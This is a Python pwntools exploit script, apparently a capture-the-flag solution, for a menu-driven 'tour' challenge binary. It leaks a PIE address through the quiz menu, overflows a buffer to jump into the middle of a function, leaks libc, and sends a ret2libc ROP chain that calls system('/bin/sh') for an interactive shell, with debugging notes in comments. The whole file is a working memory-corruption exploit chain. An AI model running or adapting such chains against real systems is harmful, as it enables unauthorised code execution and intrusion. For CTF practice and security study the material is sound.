#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./tour_patched")

# Get from other challenges since all of them used the same libc
libc = ELF("./libc.so.6")


def start(argv=[], *a, **kw):
    nc = "nc localhost 1337"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

io.sendlineafter(b"name: ", b"name")

io.sendlineafter(b"choice: ", b"1")
io.sendlineafter(b"luggage is?\n", b"b" * 8 + b"\xe7")

io.sendlineafter(b"choice: ", b"2")
io.sendlineafter(b"to do: ", str(0x1 << 32).encode())
io.recvline()
io.recvline()
boarding_pass = io.recvline(keepends=False)
log.info(f"pass: {boarding_pass}")

io.sendlineafter(b"choice: ", b"3")
io.sendlineafter(b"Choose: ", b"3")
io.sendlineafter(b"Choose: ", b"2")
io.recvline()
leak_pie = u64(io.recvline(keepends=False).ljust(8, p8(0)))
elf.address = leak_pie - 0x3dd8
log.info(f"{elf.address=:#x}")

io.sendlineafter(b"Choose: ", b"1")
io.sendline(b"Daw Aung San Suu Kyi")
io.sendline(b"135")
io.sendline(b"Hkakabo Razi")
io.sendline(b"Shan State")

io.sendlineafter(b"Choose: ", b"4")
io.sendlineafter(b"choice: ", b"4")
io.sendlineafter(b"pass?\n", boarding_pass)

io.sendlineafter(b"take?: ", b"A" * 24 +
                 p64(elf.symbols["quizz_time"] + 309))

pause()
io.sendlineafter(b"choice: ", b"2")

"""
For some weird reason, these two fgets do not read the input correctly?
(no impact on our exploit)
Turns out our input buffer overlaps with the address used by __uflow
"""
io.sendline(b"zzzz")
io.sendline(b"yyyy")

io.sendline(b"xxxx")

pad = 10
ret = 0x00001016 + elf.address
payload = b"b" * pad
payload += flat(elf.symbols["quizz_time"],
                ret,  # I assume it's for stack alignment
                elf.symbols["menu"])

"""
For some whatever weird reason, it overflows on
fgets -> _IO_getline_info

Ans: this is because we jumped to the middle of `quizz_time` and there is no
function prologue happening. Furthermore, the answer buffer for the fourth
question is close to _IO_getline_info saved rip (less than 0x32 bytes, which is
the third argument of fgets)

After observing, the fgets on this binary does not use heap as a temporary
buffer, this is because stdin is unbuffered (by setvbuf)

Turns out the temporary buffer problem is unrelated to the buffer overflow
"""
io.sendline(payload)

# Now returns to `quizz_time`
io.sendlineafter(b"Choose: ", b"3")
io.sendlineafter(b"Choose: ", b"2")

io.recvline()
leak_libc = u64(io.recvline(keepends=False).ljust(8, p8(0)))
log.info(f"{leak_libc=:#x}")
libc.address = leak_libc - 0x219aa0
assert libc.address & 0xfff == 0
log.info(f"{libc.address=:#x}")

io.sendlineafter(b"Choose: ", b"4")
io.sendlineafter(b"name: ", b"fuck")
io.sendlineafter(b"choice: ", b"2")

io.sendline(b"aaaa")
io.sendline(b"aaaa")
io.sendline(b"aaaa")

pad = 10
pop_rdi = 0x0002a3e5 + libc.address
payload = b"b" * pad
payload += flat(pop_rdi, next(libc.search(b"/bin/sh\x00")),
                libc.symbols["system"])

io.sendline(payload)

io.interactive()
